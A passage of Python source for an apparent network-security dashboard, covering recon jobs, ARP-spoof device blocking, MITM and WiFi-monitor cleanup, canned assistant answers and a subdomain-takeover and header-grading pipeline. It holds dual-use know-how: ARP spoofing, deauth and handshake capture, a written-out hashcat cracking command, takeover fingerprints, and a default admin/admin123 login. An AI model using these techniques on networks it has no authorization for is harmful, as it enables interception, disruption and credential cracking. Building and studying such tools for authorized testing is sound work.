            # Persist
            conn = get_db()
            for r in results:
                try:
                    conn.execute(
                        """INSERT OR IGNORE INTO bb_live_hosts (target,url,host,status_code,title,tech_stack,content_length,probed_at)
                           VALUES (?,?,?,?,?,?,?,?)""",
                        (target, r.get("url",""), r.get("host",""), r.get("status_code",0), r.get("title",""),
                         ",".join(r.get("tech",[])), r.get("content_length",0), datetime.now().isoformat()),
                    )
                except Exception:
                    pass
            conn.execute("UPDATE bb_jobs SET status='done',finished_at=?,progress=100,total=?,findings_json=?,log_tail=? WHERE job_id=?",
                         (datetime.now().isoformat(), total, json.dumps(results), f"Live hosts: {len(results)}/{total}", job_id))
            conn.commit(); conn.close()
            with bb_lock:
                bb_jobs[job_id].update({"status":"done","finished_at":datetime.now().isoformat(),
                                        "progress":100,"total":total,"findings":results})
            audit("bb_live_probe", details=f"{target} live={len(results)}/{total}")
        except Exception as e:
            with bb_lock:
                bb_jobs[job_id].update({"status":"failed","error":str(e),"finished_at":datetime.now().isoformat()})
            conn = get_db()
            conn.execute("UPDATE bb_jobs SET status='failed',finished_at=?,error=? WHERE job_id=?",
                         (datetime.now().isoformat(), str(e), job_id))
            conn.commit(); conn.close()

    threading.Thread(target=run, daemon=True).start()
    return job_id


def bb_start_custom_cmd(target: str, cmd: list[str]) -> str:
    job_id = bb_new_job(target, "cmd-runner")

    def run():
        with bb_lock:
            bb_jobs[job_id]["status"] = "running"
        lines = []
        try:
            for line in bb_run_command_stream(cmd, job_id, timeout=300):
                lines.append(line)
            with bb_lock:
                bb_jobs[job_id].update({"status":"done","finished_at":datetime.now().isoformat(),
                                        "progress":100,"total":len(lines),
                                        "log_tail": "".join(lines)[-4000:]})
            conn = get_db()
            conn.execute("UPDATE bb_jobs SET status='done',finished_at=?,progress=100,total=?,log_tail=? WHERE job_id=?",
                         (datetime.now().isoformat(), len(lines), "".join(lines)[-4000:], job_id))
            conn.commit(); conn.close()
            audit("bb_cmd", details=f"cmd={' '.join(cmd)[:200]}")
        except Exception as e:
            with bb_lock:
                bb_jobs[job_id].update({"status":"failed","error":str(e),"finished_at":datetime.now().isoformat()})
            conn = get_db()
            conn.execute("UPDATE bb_jobs SET status='failed',finished_at=?,error=?,log_tail=? WHERE job_id=?",
                         (datetime.now().isoformat(), str(e), bb_jobs[job_id].get("log_tail",""), job_id))
            conn.commit(); conn.close()

    threading.Thread(target=run, daemon=True).start()
    return job_id


def bb_get_job(job_id: str) -> dict | None:
    with bb_lock:
        j = bb_jobs.get(job_id)
        if not j:
            # try DB
            conn = get_db()
            r = conn.execute("SELECT * FROM bb_jobs WHERE job_id=?", (job_id,)).fetchone()
            conn.close()
            return dict(r) if r else None
        return dict(j)


def bb_list_subdomains(target: str, limit: int = 500) -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT subdomain,source,discovered_at FROM bb_subdomains WHERE target=? ORDER BY discovered_at DESC LIMIT ?",
                        (target, limit)).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def bb_list_live_hosts(target: str, limit: int = 500) -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT * FROM bb_live_hosts WHERE target=? ORDER BY probed_at DESC LIMIT ?",
                        (target, limit)).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def bb_list_jobs(target: str | None = None, limit: int = 50) -> list[dict]:
    conn = get_db()
    if target:
        rows = conn.execute("SELECT job_id,target,kind,status,started_at,finished_at,started_by,progress,total,error FROM bb_jobs WHERE target=? ORDER BY started_at DESC LIMIT ?",
                            (target, limit)).fetchall()
    else:
        rows = conn.execute("SELECT job_id,target,kind,status,started_at,finished_at,started_by,progress,total,error FROM bb_jobs ORDER BY started_at DESC LIMIT ?",
                            (limit,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ============================================================
# BANDWIDTH/SCANNER/PRUNE/PARENTAL
# ============================================================
prev_counters = {}
bandwidth_hog_alerts: list[dict] = []


def get_bandwidth() -> dict:
    global prev_counters
    counters = psutil.net_io_counters(pernic=True)
    out = {}; now = time.time()
    for iface, stats in counters.items():
        if iface == "lo" or iface.startswith("veth") or iface.startswith("docker"):
            continue
        if iface in prev_counters:
            prev = prev_counters[iface]; dt = now - prev["time"]
            if dt > 0:
                dl = (stats.bytes_recv - prev["recv"]) / dt
                ul = (stats.bytes_sent - prev["sent"]) / dt
                out[iface] = {"download_speed": dl, "upload_speed": ul, "total_recv": stats.bytes_recv,
                              "total_sent": stats.bytes_sent, "packets_recv": stats.packets_recv,
                              "packets_sent": stats.packets_sent, "errors_in": stats.errin,
                              "errors_out": stats.errout}
        prev_counters[iface] = {"recv": stats.bytes_recv, "sent": stats.bytes_sent, "time": now}
    return out


hog_tracking: dict[str, dict] = {}


def check_bandwidth_hogs():
    global bandwidth_hog_alerts, hog_tracking
    try:
        now = datetime.now()
        speeds = get_bandwidth()
        total = sum(i["download_speed"] + i["upload_speed"] for i in speeds.values())
        if total <= 0:
            return
        for iface, info in speeds.items():
            rate = info["download_speed"] + info["upload_speed"]
            pct = (rate/total)*100
            if pct > 80:
                if iface not in hog_tracking:
                    hog_tracking[iface] = {"since": now, "pct": pct}; continue
                if (now - hog_tracking[iface]["since"]) >= timedelta(minutes=5):
                    recent = any(a["interface"]==iface and (now - datetime.fromisoformat(a["timestamp"])) < timedelta(minutes=10)
                                 for a in bandwidth_hog_alerts)
                    if not recent:
                        msg = f"Bandwidth hog: {iface} at {pct:.1f}% for 5+min"
                        bandwidth_hog_alerts.append({"timestamp": now.isoformat(), "interface": iface, "percentage": pct})
                        bandwidth_hog_alerts[:] = bandwidth_hog_alerts[-50:]
                        generate_alert("bandwidth_hog", msg)
            else:
                hog_tracking.pop(iface, None)
    except Exception as e:
        print(f"[!] bw hog error: {e}")


def log_bandwidth():
    counters = psutil.net_io_counters(pernic=True)
    conn = get_db(); now = datetime.now().isoformat()
    for iface, stats in counters.items():
        if iface == "lo" or iface.startswith("veth") or iface.startswith("docker"):
            continue
        conn.execute("INSERT INTO bandwidth_log (timestamp,interface,bytes_sent,bytes_recv) VALUES (?,?,?,?)",
                     (now, iface, stats.bytes_sent, stats.bytes_recv))
    conn.commit(); conn.close()
    check_bandwidth_hogs()


scanner_running = False


def background_scanner():
    global scanner_running
    scanner_running = True
    last_prune = 0
    threading.Thread(target=scan_worker, daemon=True).start()
    while scanner_running:
        try:
            t0 = time.time()
            devices = arp_scan()
            new_count = update_devices_db(devices)
            dur = time.time() - t0
            conn = get_db()
            conn.execute("INSERT INTO scan_log (timestamp,devices_found,new_devices,scan_duration) VALUES (?,?,?,?)",
                         (datetime.now().isoformat(), len(devices), new_count, round(dur,2)))
            conn.commit(); conn.close()
            log_bandwidth()
            print(f"[*] Scan: {len(devices)} devices, {new_count} new ({dur:.1f}s)")
            check_security_events(devices)
            if time.time() - last_prune > 6*3600:
                prune_old_data(); last_prune = time.time()
        except Exception as e:
            print(f"[!] scanner error: {e}")
        time.sleep(SCAN_INTERVAL)


def check_security_events(devices):
    conn = get_db(); c = conn.cursor()
    for dev in devices:
        existing = c.execute("SELECT * FROM devices WHERE mac=?", (dev["mac"],)).fetchone()
        if existing and existing["ip"] != dev["ip"]:
            c.execute("INSERT INTO alerts (timestamp,alert_type,message,device_mac) VALUES (?,?,?,?)",
                      (datetime.now().isoformat(), "ip_change",
                       f"IP changed for {dev['mac']}: {existing['ip']} -> {dev['ip']}", dev["mac"]))
    conn.commit(); conn.close()


def generate_security_report() -> dict:
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    online = conn.execute("SELECT COUNT(*) FROM devices WHERE is_online=1").fetchone()[0]
    blocked = conn.execute("SELECT COUNT(*) FROM devices WHERE is_blocked=1").fetchone()[0]
    unknown = conn.execute("SELECT COUNT(*) FROM devices WHERE is_known=0").fetchone()[0]
    alerts = conn.execute("SELECT * FROM alerts ORDER BY timestamp DESC LIMIT 20").fetchall()
    sus = conn.execute("SELECT * FROM devices WHERE is_blocked=1 OR is_known=0 ORDER BY last_seen DESC").fetchall()
    conn.close()
    return {"timestamp": datetime.now().isoformat(),
            "summary": {"total_devices": total, "online_devices": online, "blocked_devices": blocked, "unknown_devices": unknown},
            "recent_alerts": [dict(a) for a in alerts], "suspicious_devices": [dict(d) for d in sus]}


def _rule_applies_today(rule_day, weekday):
    if rule_day == "everyday": return True
    if rule_day == "weekdays": return weekday in ("monday","tuesday","wednesday","thursday","friday")
    if rule_day == "weekends": return weekday in ("saturday","sunday")
    return rule_day == weekday


def _time_in_window(now, start, end):
    try:
        sh, sm = map(int, start.split(":"))
        eh, em = map(int, end.split(":"))
        smin, emin = sh*60+sm, eh*60+em
        nmin = now.hour*60 + now.minute
    except Exception:
        return False
    if smin <= emin:
        return smin <= nmin <= emin
    return nmin >= smin or nmin <= emin


scheduler_blocked: set[str] = set()


def parental_enforcer():
    global scheduler_blocked
    while scanner_running:
        try:
            now = datetime.now(); wd = now.strftime("%A").lower()
            conn = get_db(); rules = conn.execute("SELECT * FROM parental_rules").fetchall(); conn.close()
            gw = get_default_gateway(); to_b, to_u = [], []
            for rule in rules:
                if rule["action"] != "block": continue
                if not _rule_applies_today(rule["day_of_week"], wd): continue
                if _time_in_window(now, rule["start_time"], rule["end_time"]):
                    to_b.append(rule["device_mac"])
                else:
                    to_u.append(rule["device_mac"])
            conn = get_db()
            for mac in set(to_b):
                if mac in scheduler_blocked: continue
                dev = conn.execute("SELECT ip FROM devices WHERE mac=?", (mac,)).fetchone()
                if not dev: continue
                ok, msg = block_device(dev["ip"], gw)
                if ok:
                    scheduler_blocked.add(mac)
                    conn.execute("UPDATE devices SET is_blocked=1 WHERE mac=?", (mac,))
                    conn.execute("INSERT INTO audit_log (timestamp,action_type,device_mac,device_ip,user,details,success) VALUES (?,?,?,?,?,?,1)",
                                 (now.isoformat(),"parental_block",mac,dev["ip"],"scheduler",msg))
                    generate_alert("parental_block", f"Parental: blocked {dev['ip']}", mac)
            for mac in set(to_u):
                if mac not in scheduler_blocked: continue
                dev = conn.execute("SELECT ip FROM devices WHERE mac=?", (mac,)).fetchone()
                if not dev: continue
                ok, msg = unblock_device(dev["ip"], gw)
                if ok:
                    scheduler_blocked.discard(mac)
                    conn.execute("UPDATE devices SET is_blocked=0 WHERE mac=?", (mac,))
                    conn.execute("INSERT INTO audit_log (timestamp,action_type,device_mac,device_ip,user,details,success) VALUES (?,?,?,?,?,?,1)",
                                 (now.isoformat(),"parental_unblock",mac,dev["ip"],"scheduler",msg))
            conn.commit(); conn.close()
        except Exception as e:
            print(f"[!] parental error: {e}")
        time.sleep(30)


def prune_old_data():
    try:
        conn = get_db()
        cutoffs = {
            "alerts": timedelta(days=int(os.environ.get("RETAIN_ALERTS_DAYS","30"))),
            "audit_log": timedelta(days=int(os.environ.get("RETAIN_AUDIT_DAYS","90"))),
            "dns_query_log": timedelta(days=int(os.environ.get("RETAIN_DNS_DAYS","14"))),
            "passive_dns_log": timedelta(days=int(os.environ.get("RETAIN_DNS_DAYS","14"))),
            "bandwidth_log": timedelta(days=int(os.environ.get("RETAIN_BW_DAYS","7"))),
            "ja3_log": timedelta(days=int(os.environ.get("RETAIN_JA3_DAYS","30"))),
            "port_scan_history": timedelta(days=int(os.environ.get("RETAIN_PORT_DAYS","90"))),
            "wifi_event_log": timedelta(days=int(os.environ.get("RETAIN_WIFI_DAYS","30"))),
            "wifi_signal_samples": timedelta(days=int(os.environ.get("RETAIN_WIFI_DAYS","14"))),
        }
        for tbl, delta in cutoffs.items():
            cutoff = (datetime.now()-delta).isoformat()
            try:
                conn.execute(f"DELETE FROM {tbl} WHERE timestamp < ?", (cutoff,))
            except Exception as e:
                print(f"[!] prune {tbl}: {e}")
        conn.commit(); conn.close()
        print("[*] Old data pruned")
    except Exception as e:
        print(f"[!] prune error: {e}")


def cleanup_network_actions():
    global scanner_running
    scanner_running = False
    try: stop_packet_capture()
    except Exception: pass
    try:
        if wifi_state.get("monitor_active"):
            wifi_state["survey_running"] = False
            wifi_state["handshake_capture_running"] = False
            wifi_disable_monitor()
    except Exception: pass
    gw = get_default_gateway()
    for ip in list(blocking_threads.keys()):
        try: unblock_device(ip, gw)
        except Exception: pass
    for ip in list(active_mitm_attacks.keys()):
        try: stop_mitm_attack(ip)
        except Exception: pass
    try:
        if mitm_wizard_state.get("target_ip") or mitm_wizard_state.get("forward_prev") is not None:
            stop_mitm_wizard()
    except Exception: pass
    time.sleep(0.5)
    print("[*] Cleanup complete (ARP/forwarding/managed mode restored)")


# ============================================================
# BATCH F: AI BRAIN (offline intents + optional LLM)
# ============================================================
BRAIN_KNOWLEDGE = {
    "scan": {
        "match": ["scan network", "discover devices", "who's on my network", "scan devices", "rescan", "scan now"],
        "answer": ("I can run a fresh ARP scan right now via the Devices section (POST /api/scan). "
                   "The auto-scanner also runs every {si} seconds. Results are saved in the devices table."),
        "action": "/api/scan"
    },
    "block": {
        "match": ["block device", "kick off", "ban device", "disconnect device"],
        "answer": ("To block a device, find its MAC in Devices, click Block. This ARP-spoofs its gateway "
                   "traffic until you click Unblock (or shutdown). All blocks are audit-logged and auto-restored on exit. "
                   "Use on YOUR network only."),
    },
    "parental": {
        "match": ["parental", "schedule block", "bedtime", "screen time"],
        "answer": ("Parental rules block/unblock a device on a weekly schedule (day-of-week + start/end time). "
                   "Add them under Devices > Parental. They run every 30s in the background."),
    },
    "port": {
        "match": ["port scan", "open ports", "scan ports", "syn scan", "udp scan"],
        "answer": ("Use a device's Port Scan button. Pick Connect (safe, fast) or SYN/UDP (stealthier, needs root). "
                   "New open ports generate alerts. 80 services are fingerprinted with banners + regex."),
    },
    "wifi": {
        "match": ["wifi audit", "evil twin", "deauth", "rogue ap", "wifi security"],
        "answer": ("WiFi Audit needs a Linux adapter + root. Enable monitor mode (airmon-ng or iw), run a site survey, "
                   "and look for evil-twin flags (same SSID, different BSSID/crypto). Deauth lab and WPA handshake capture "
                   "export to hashcat -m 22000 for authorized testing of YOUR network only."),
    },
    "handshake": {
        "match": ["handshake", "wpa crack", "hashcat", "pmkid"],
        "answer": ("Captured WPA handshakes are stored in wifi_handshakes with a base64 hashcat 22000 blob. Download the "
                   "pcap under WiFi Lab and run: hashcat -m 22000 <file> wordlist.txt — only against networks you own."),
    },
    "vuln": {
        "match": ["vulnerability", "vuln scan", "cve", "weakness"],
        "answer": ("Vuln scan checks anonymous FTP, telnet, old OpenSSH banners, HTTP Basic auth, missing security headers, "
                   "open Redis. It's a quick pass — not a replacement for nmap + dedicated scanners."),
    },
    "recon": {
        "match": ["recon", "reconnaissance", "subdomains", "deep web", "hidden pages"],
        "answer": ("One-click recon does DNS/subdomains (crt.sh + wordlist + subfinder/assetfinder/amass), open-port scan, "
                   "HTTP fetch/TLS cert, optional VirusTotal, and a deep-web scan over ~370 admin/secret paths."),
    },
    "bb": {
        "match": ["bug bounty", "bounty", "enumerate", "live hosts"],
        "answer": ("Bug Bounty module is for AUTHORIZED targets you add explicitly. It runs multi-source subdomain enum, "
                   "concurrent HTTP probing (httpx-style), and an allowlisted command runner for subfinder/assetfinder/amass/httpx/ffuf/nmap/dig/whois/curl."),
    },
    "ai": {
        "match": ["ai brain", "llm", "openai", "ollama", "gpt", "analyst"],
        "answer": ("Offline intents work with no API key. To enable the cloud LLM analyst, set llm_enabled=1 plus llm_base_url, "
                   "llm_model, and llm_api_key in Settings. To use local Ollama, set llm_base_url=http://127.0.0.1:11434 and llm_model."),
    },
    "password": {
        "match": ["default password", "password", "login credentials"],
        "answer": ("Default is admin/admin123. Set ADMIN_USERNAME/ADMIN_PASSWORD (or ADMIN_PASSWORD_HASH) env vars before deploying. "
                   "SECRET_KEY must also be set to a long random value."),
    },
    "dns": {
        "match": ["dns", "threat intel", "suspicious domain", "ja3", "malware"],
        "answer": ("Every DNS query is logged with a threat score (suspicious TLDs, DGAs, tunneling length, malware keywords). "
                   "TLS ClientHellos are fingerprinted (JA3) and matched against a small known-malware set."),
    },
    "csr": {
        "match": ["csrf", "403 login", "blank page", "proxied preview"],
        "answer": ("CSRF tokens are enforced on POST/PUT/DELETE except /login (required for first auth before the session cookie exists). "
                   "If pages are blank behind a preview proxy, check that Chart.js/vis.js CDN is reachable — tables still work if they're blocked."),
    },
    "prorecon": {
        "match": ["pro recon", "full recon", "one click", "one-click", "attack surface", "exposure score", "risk score"],
        "answer": ("Pro Recon is the one-click pipeline (⚡ section): DNS intel → subdomains → port sweep → HTTP/TLS "
                   "fingerprinting → security-header grades → subdomain-takeover checks → lookalike-domain radar → "
                   "WHOIS/RDAP + IP intel → risk score (0-100 with fixes) → attack-surface snapshot + DNA diff. "
                   "Pick quick or full profile, watch the live terminal, then download the HTML report."),
    },
    "takeover": {
        "match": ["takeover", "dangling cname", "subdomain takeover"],
        "answer": ("The takeover checker maps each CNAME against ~27 hosted services (GitHub Pages, Heroku, S3, Azure, "
                   "Netlify, Vercel, Shopify…) and flags NXDOMAIN targets or 'unclaimed page' markers as VULNERABLE. "
                   "Review entries need manual verification. Fix by re-claiming the resource or deleting the record."),
    },
    "lookalike": {
        "match": ["lookalike", "typosquat", "homoglyph", "phishing domain", "bitsquat"],
        "answer": ("The Lookalike Radar generates omissions/duplications/transpositions/homoglyphs/hyphenations/TLD-swaps "
                   "of your domain, then resolves and HTTP-probes the live ones — defensive brand-impersonation detection."),
    },
    "timemachine": {
        "match": ["time machine", "snapshot", "dna", "diff", "what changed", "change radar"],
        "answer": ("Every Pro Recon run stores an attack-surface snapshot with a 12-char DNA fingerprint. Comparing two "
                   "snapshots shows added/removed subdomains, new/closed ports, tech and cert changes — open the Time "
                   "Machine tab in Pro Recon and pick two snapshots to diff."),
    },
    "help": {
        "match": ["help", "what can you do", "commands", "features"],
        "answer": ("I can help with: scanning, blocking, parental rules, port/vuln scans, WiFi audit/handshakes, recon (subdomains + deep-web), "
                   "bug-bounty enumeration, and explaining any dashboard section. Just ask."),
    },
}


def ask_brain(question: str, context: str = "") -> dict:
    """Offline intent classifier. Returns {answer, intent, action, confidence}."""
    q = question.lower().strip()
    best_intent = None; best_score = 0
    for name, data in BRAIN_KNOWLEDGE.items():
        score = 0
        for kw in data["match"]:
            if kw in q:
                score += len(kw.split())
        if score > best_score:
            best_score = score; best_intent = name
    if not best_intent or best_score == 0:
        # Fall back to simple keyword hints
        return {
            "answer": ("I'm an offline assistant for the Network Analyzer. Ask about: "
                       "scanning, blocking, parental rules, ports, WiFi, handshakes/hashcat, "
                       "recon, PRO RECON (one-click pipeline, takeover, lookalikes, time machine), "
                       "bug bounty, AI/LLM settings, DNS/threat intel, CSRF, or type 'help'."),
            "intent": "fallback", "action": None, "confidence": 0
        }
    data = BRAIN_KNOWLEDGE[best_intent]
    answer = data["answer"].replace("{si}", str(SCAN_INTERVAL))
    if context:
        answer += "\n\n(Context: " + context[:500] + ")"
    ai_memory.append({"role": "assistant", "content": answer, "intent": best_intent})
    # keep memory bounded
    while len(ai_memory) > AI_MEMORY_LIMIT:
        ai_memory.pop(0)
    return {"answer": answer, "intent": best_intent, "action": data.get("action"),
            "confidence": min(100, best_score * 20)}


def llm_chat(question: str, system: str | None = None, context: str | None = None) -> tuple[bool, str]:
    """Call an OpenAI-compatible API (works with OpenAI, Ollama in OpenAI mode, etc.)."""
    enabled = get_setting("llm_enabled", "0") == "1"
    if not enabled:
        return False, "LLM disabled. Set llm_enabled=1 in Settings."
    if context:
        question = f"{question}\n\n(Context from dashboard: {context[:600]})"
    base = get_setting("llm_base_url", "https://api.openai.com/v1").rstrip("/")
    model = get_setting("llm_model", "gpt-4o-mini")
    key = get_setting("llm_api_key", "")
    if not key and "openai" in base and "api.openai" in base:
        return False, "Missing llm_api_key for OpenAI."
    if not REQUESTS_AVAILABLE:
        return False, "requests library missing"
    sys_msg = system or (
        "You are the AI assistant for the Network Analyzer security dashboard. "
        "Keep answers short, practical, and remind the user to only test networks they own or have explicit permission to test. "
        "Do not help attack systems you don't own."
    )
    msgs = [{"role":"system","content":sys_msg}]
    # include recent memory
    msgs.extend(ai_memory[-8:])
    msgs.append({"role":"user","content":question})
    url = f"{base}/chat/completions"
    headers = {"Content-Type": "application/json"}
    if key:
        headers["Authorization"] = f"Bearer {key}"
    try:
        r = requests.post(url, headers=headers, json={"model":model,"messages":msgs,"temperature":0.3,"stream":False}, timeout=30)
        if not r.ok:
            return False, f"LLM error {r.status_code}: {r.text[:200]}"
        data = r.json()
        content = data["choices"][0]["message"]["content"]
        ai_memory.append({"role":"user","content":question})
        ai_memory.append({"role":"assistant","content":content})
        return True, content
    except Exception as e:
        return False, f"LLM call failed: {e}"


# ============================================================
# BATCH H: PRO RECON — one-click full pipeline
#   * DNS intelligence (A/AAAA/MX/NS/TXT/SOA/CAA/CNAME + PTR)
#   * subdomain takeover detection (dangling CNAME fingerprints)
#   * HTTP security-header grading (A+..F)
#   * lookalike/typosquat domain radar (defensive brand protection)
#   * WHOIS via keyless RDAP + IP intel
#   * attack-surface snapshots + DNA fingerprint + diff ("Time Machine")
#   * risk-score engine (0..100) with prioritized remediation advice
#   * attack-path graph (domain -> subdomain -> IP -> port -> service)
#   * standalone HTML report export
# All phases are read-only OSINT against targets you are authorized to test.
# ============================================================
pro_jobs: dict[str, dict] = {}
pro_lock = Lock()

# Fingerprint DB: CNAME suffix -> (service label, "unclaimed" page marker or None).
# If the marker is present in the HTTP body the hosted resource is unclaimed ->
# dangling, take-overable. None means we fall back to an NXDOMAIN check on the
# CNAME target itself.
TAKEOVER_CNAME: dict[str, tuple[str, str | None]] = {
    "github.io":            ("GitHub Pages", "there isn't a github pages site here"),
    "herokuapp.com":        ("Heroku", "no such app"),
    "herokudns.com":        ("Heroku", None),
    "pantheonsite.io":      ("Pantheon", "the gods are wise"),
    "fastly.net":           ("Fastly", "fastly error: unknown domain"),
    "azurewebsites.net":    ("Azure Web Apps", "404 web site not found"),
    "cloudapp.net":         ("Azure CloudApp", None),
    "azureedge.net":        ("Azure CDN", None),
    "trafficmanager.net":   ("Azure Traffic Manager", None),
    "blob.core.windows.net":("Azure Blob", "blobnotfound"),
    "s3.amazonaws.com":     ("AWS S3", "nosuchbucket"),
    "elasticbeanstalk.com": ("AWS Elastic Beanstalk", None),
    "cloudfront.net":       ("AWS CloudFront", "bad request"),
    "wordpress.com":        ("WordPress.com", "do you want to register"),
    "myshopify.com":        ("Shopify", "sorry, this shop is currently unavailable"),
    "surge.sh":             ("Surge", "project not found"),
    "bitbucket.io":         ("Bitbucket", "repository not found"),
    "readme.io":            ("ReadMe", "project doesnt exist"),
    "ghost.io":             ("Ghost", "the thing you were looking for is no longer here"),
    "zendesk.com":          ("Zendesk", "help center closed"),
    "tumblr.com":           ("Tumblr", "there's nothing here"),
    "cargocollective.com":  ("Cargo", "404 not found"),
    "unbouncepages.com":    ("Unbounce", "the requested url was not found"),
    "strikingly.com":       ("Strikingly", "but if you're looking to build your own website"),
    "webflow.io":           ("Webflow", "the page you are looking for doesn't exist"),
    "fly.dev":              ("Fly.io", None),
    "netlify.app":          ("Netlify", "not found"),
    "vercel.app":           ("Vercel", "the deployment could not be found"),
}

HOMOGLYPH = {
    "o": ["0"], "0": ["o"], "l": ["1", "i"], "i": ["1", "l"], "1": ["l", "i"],
    "e": ["3"], "3": ["e"], "a": ["4"], "4": ["a"], "s": ["5"], "5": ["s"],
    "g": ["9"], "t": ["7"], "b": ["8"], "m": ["rn"], "w": ["vv"], "u": ["v"],
}
LOOKALIKE_TLDS = ["net", "org", "io", "co", "info", "online", "site", "xyz", "app",
                  "dev", "me", "cc", "cloud", "shop", "store", "tech", "live", "vip", "pro", "club"]

RISKY_PORTS = {
    21: "FTP (plaintext credentials)", 23: "Telnet (plaintext)", 445: "SMB file sharing",
    1433: "MS SQL Server", 1521: "Oracle DB", 3306: "MySQL", 3389: "RDP remote desktop",
    5432: "PostgreSQL", 5900: "VNC remote desktop", 6379: "Redis (often unauthenticated)",
    9200: "Elasticsearch", 11211: "Memcached", 27017: "MongoDB", 2375: "Docker API (unauthenticated)",
    5984: "CouchDB", 25: "SMTP (open-relay check)", 2323: "Telnet-alt (plaintext)",
}

SECURITY_HEADER_CHECKS = [
    ("strict-transport-security", 25, "HSTS forces HTTPS"),
    ("content-security-policy",   20, "CSP mitigates XSS/injection"),
    ("x-content-type-options",    10, "stops MIME sniffing (nosniff)"),
    ("x-frame-options",           10, "clickjacking protection"),
    ("referrer-policy",           10, "limits referrer leakage"),
    ("permissions-policy",        10, "restricts powerful browser features"),
    ("x-xss-protection",           5, "legacy XSS filter hint"),
]


def _cname_of(host: str) -> str | None:
    if not DNS_AVAILABLE:
        return None
    try:
        for r in dns.resolver.resolve(host, "CNAME", lifetime=4):
            return str(r.target).rstrip(".").lower()
    except Exception:
        pass
    return None


def _is_nxdomain(name: str) -> bool:
    """True when the name demonstrably does not resolve."""
    if DNS_AVAILABLE:
        try:
            dns.resolver.resolve(name, "A", lifetime=4)
            return False
        except dns.resolver.NXDOMAIN:
            return True
        except Exception:
            return False  # SERVFAIL/timeout -> unknown, don't cry wolf
    return not _resolve(name)


def _quick_body(host: str, timeout: float = 5.0) -> str | None:
    if not REQUESTS_AVAILABLE:
        return None
    for scheme in ("https", "http"):
        try:
            r = requests.get(f"{scheme}://{host}/", timeout=timeout, verify=False,
                             allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 Network-Analyzer"})
            return r.text[:60000]
        except Exception:
            continue
    return None


def _canary_port_check(ip: str) -> dict:
    """Vantage-point truth check: touch a random high port that is virtually
    guaranteed closed. If the connect 'succeeds', a transparent egress proxy or
    tarpit is lying to us and connect-scan results from this host are unreliable."""
    canary = secrets.randbelow(20000) + 40000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.5)
    try:
        open_ = s.connect_ex((ip, canary)) == 0
    except Exception:
        open_ = False
    finally:
        s.close()
    return {"canary_port": canary, "canary_open": open_, "unreliable_vantage": open_}


def _takeover_scan(names: list[str]) -> list[dict]:
    """Subdomain takeover check: dangling CNAMEs pointing at unclaimed hosted services."""
    out: list[dict] = []

    def check(name: str):
        cname = _cname_of(name)
        if not cname:
            return None
        for suffix, (svc, marker) in TAKEOVER_CNAME.items():
            if cname == suffix or cname.endswith("." + suffix):
                if marker:
                    body = _quick_body(name) or ""
                    if marker in body.lower():
                        return {"subdomain": name, "cname": cname, "service": svc,
                                "status": "vulnerable",
                                "evidence": f"Unclaimed-page marker found: '{marker[:60]}'"}
                    return {"subdomain": name, "cname": cname, "service": svc,
                            "status": "review",
                            "evidence": "Points to a take-overable service but the page looks claimed"}
                if _is_nxdomain(cname):
                    return {"subdomain": name, "cname": cname, "service": svc,
                            "status": "vulnerable",
                            "evidence": f"CNAME target {cname} is NXDOMAIN (dangling)"}
                return {"subdomain": name, "cname": cname, "service": svc,
                        "status": "review", "evidence": "CNAME resolves; verify the resource is still claimed"}
        if _is_nxdomain(cname):
            return {"subdomain": name, "cname": cname, "service": "",
                    "status": "potential",
                    "evidence": f"CNAME target {cname} does not resolve (dangling DNS record)"}
        return None

    with ThreadPoolExecutor(max_workers=12) as ex:
        for r in ex.map(check, names):
            if r:
                out.append(r)
    return sorted(out, key=lambda x: (x["status"] != "vulnerable", x["status"] != "potential", x["subdomain"]))


def _headers_grade(host: str, timeout: float = 6.0) -> dict | None:
    """Grade a host's HTTP security headers A+..F (securityheaders.com style)."""
    if not REQUESTS_AVAILABLE:
        return None
    resp = None
    used_scheme = None
    for scheme in ("https", "http"):
        try:
            resp = requests.get(f"{scheme}://{host}/", timeout=timeout, verify=False,
                                allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0 Network-Analyzer"})
            used_scheme = scheme
            break
        except Exception:
            continue
    if resp is None:
        return None
    headers = {k.lower(): v for k, v in resp.headers.items()}
    checks = []
    score = 0
    for key, weight, note in SECURITY_HEADER_CHECKS:
        ok = key in headers
        # CSP frame-ancestors substitutes X-Frame-Options
        if key == "x-frame-options" and not ok:
            ok = "frame-ancestors" in headers.get("content-security-policy", "").lower()
        if ok:
            score += weight
        checks.append({"header": key, "ok": ok, "weight": weight, "note": note,
                       "value": headers.get(key, "")[:160] if ok else ""})
    issues = []
    server = headers.get("server", "")
    powered = headers.get("x-powered-by", "")
    if server:
        issues.append(f"Server header disclosure: {server[:80]}")
    if powered:
        score = max(0, score - 5)
        issues.append(f"X-Powered-By disclosure: {powered[:80]}")
    if used_scheme == "https":
        score += 10
    if "strict-transport-security" in headers and "max-age=0" not in headers.get("strict-transport-security", ""):
        try:
            ma = int(re.search(r"max-age=(\d+)", headers["strict-transport-security"]).group(1))
            if ma >= 15552000:
                score += 2  # long HSTS
        except Exception:
            pass
    score = min(100, score)
    if score >= 95:
        grade = "A+"
    elif score >= 85:
        grade = "A"
    elif score >= 70:
        grade = "B"
    elif score >= 55:
        grade = "C"
    elif score >= 40:
        grade = "D"
    else:
        grade = "F"
    if used_scheme != "https" and grade in ("A+", "A", "B"):
        grade = "C"  # plaintext-only host can't grade higher than C
    return {"host": host, "url": resp.url, "scheme": used_scheme, "grade": grade,
            "score": score, "checks": checks, "issues": issues,
            "server": server[:120], "powered_by": powered[:120],
            "status": resp.status_code}


def _dns_dump(domain: str) -> dict:
    out = {"domain": domain, "records": {}, "ptr": {}}
    types = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CAA", "CNAME", "SRV", "NS"]
    for t in dict.fromkeys(types):
        vals = []
        if DNS_AVAILABLE:
            try:
                for r in dns.resolver.resolve(domain, t, lifetime=5):
                    vals.append(str(r).rstrip("."))
            except Exception:
                pass
        elif t == "A":
            vals = _resolve(domain)
        if vals:
            out["records"][t] = sorted(set(vals))
    for ip in out["records"].get("A", [])[:5]:
        try:
            out["ptr"][ip] = socket.gethostbyaddr(ip)[0]
        except Exception:
